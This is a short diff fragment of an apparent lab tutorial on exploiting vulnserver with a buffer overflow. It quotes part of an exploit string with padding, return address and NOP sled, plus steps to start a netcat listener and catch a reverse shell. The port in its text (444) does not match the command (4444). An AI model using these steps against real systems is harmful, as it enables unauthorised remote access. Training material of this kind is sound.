@@ -68,3 +68,4 @@ Note that the `"\x90" + 32` in `shellcode = "A" * 2003 + "\xaf\x11\x50\62" + "\x
 - Start up a netcat listener on port 444 `nc -lvnp 4444` as specified port we stated in the command used to create the payload earlier
 - Now start up vulnserver on your windows machine
 - Run the script we saved and you should get a MS DOS shell
+
